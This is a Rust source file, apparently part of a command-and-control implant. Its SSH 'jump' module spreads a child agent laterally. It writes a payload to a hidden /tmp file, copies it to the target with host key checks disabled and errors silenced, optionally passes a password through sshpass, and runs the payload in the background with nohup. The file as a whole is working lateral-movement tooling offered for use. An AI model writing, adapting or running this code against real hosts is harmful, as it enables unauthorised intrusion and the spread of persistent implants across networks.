//! SSH jump module — deploys P2P child agent via system `ssh`/`scp`.

use super::{JumpParams, JumpResult};
use std::process::Command;

pub fn execute(params: &JumpParams, payload: &[u8]) -> JumpResult {
    let target = &params.target;
    let user   = &params.user;

    if target.is_empty() {
        return JumpResult::Failed { error: "target is required".into() };
    }
    if user.is_empty() {
        return JumpResult::Failed { error: "user is required for ssh jump".into() };
    }

    let remote_host = if user.is_empty() {
        target.clone()
    } else {
        format!("{}@{}", user, target)
    };

    // Write payload to a temp file
    let tmp_name = format!("/tmp/.{}", params.child_session_id);
    if let Err(e) = std::fs::write(&tmp_name, payload) {
        return JumpResult::Failed { error: format!("write temp file: {}", e) };
    }

    // Build scp command
    let mut scp_args = vec![
        "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
        "-o".to_string(), "UserKnownHostsFile=/dev/null".to_string(),
        "-o".to_string(), "LogLevel=ERROR".to_string(),
    ];

    if !params.key_path.is_empty() {
        scp_args.push("-i".to_string());
        scp_args.push(params.key_path.clone());
    }

    let remote_path = format!("/tmp/.{}", params.child_session_id);
    scp_args.push(tmp_name.clone());
    scp_args.push(format!("{}:{}", remote_host, remote_path));

    // If password auth, use sshpass
    let (scp_bin, scp_full_args) = if !params.password.is_empty() {
        ("sshpass".to_string(), {
            let mut a = vec!["-p".to_string(), params.password.clone(), "scp".to_string()];
            a.extend(scp_args);
            a
        })
    } else {
        ("scp".to_string(), scp_args)
    };

    crate::dlog!("jump", "scp: {} {:?}", scp_bin, scp_full_args);

    let scp_result = Command::new(&scp_bin)
        .args(&scp_full_args)
        .output();

    // Clean up local temp
    let _ = std::fs::remove_file(&tmp_name);

    match scp_result {
        Err(e) => return JumpResult::Failed { error: format!("scp failed: {}", e) },
        Ok(out) if !out.status.success() => {
            let stderr = String::from_utf8_lossy(&out.stderr);
            return JumpResult::Failed { error: format!("scp error: {}", stderr.trim()) };
        }
        _ => {}
    }

    // Execute the agent on the remote host
    let mut ssh_args = vec![
        "-o".to_string(), "StrictHostKeyChecking=no".to_string(),
        "-o".to_string(), "UserKnownHostsFile=/dev/null".to_string(),
        "-o".to_string(), "LogLevel=ERROR".to_string(),
    ];

    if !params.key_path.is_empty() {
        ssh_args.push("-i".to_string());
        ssh_args.push(params.key_path.clone());
    }

    ssh_args.push(remote_host.clone());
    ssh_args.push(format!(
        "chmod +x {} && nohup {} >/dev/null 2>&1 &",
        remote_path, remote_path
    ));

    let (ssh_bin, ssh_full_args) = if !params.password.is_empty() {
        ("sshpass".to_string(), {
            let mut a = vec!["-p".to_string(), params.password.clone(), "ssh".to_string()];
            a.extend(ssh_args);
            a
        })
    } else {
        ("ssh".to_string(), ssh_args)
    };

    crate::dlog!("jump", "ssh exec: {} {:?}", ssh_bin, ssh_full_args);

    let ssh_result = Command::new(&ssh_bin)
        .args(&ssh_full_args)
        .output();

    match ssh_result {
        Err(e) => JumpResult::Failed { error: format!("ssh exec failed: {}", e) },
        Ok(out) if !out.status.success() => {
            let stderr = String::from_utf8_lossy(&out.stderr);
            JumpResult::Failed { error: format!("ssh exec error: {}", stderr.trim()) }
        }
        Ok(_) => JumpResult::Success { remote_path },
    }
}
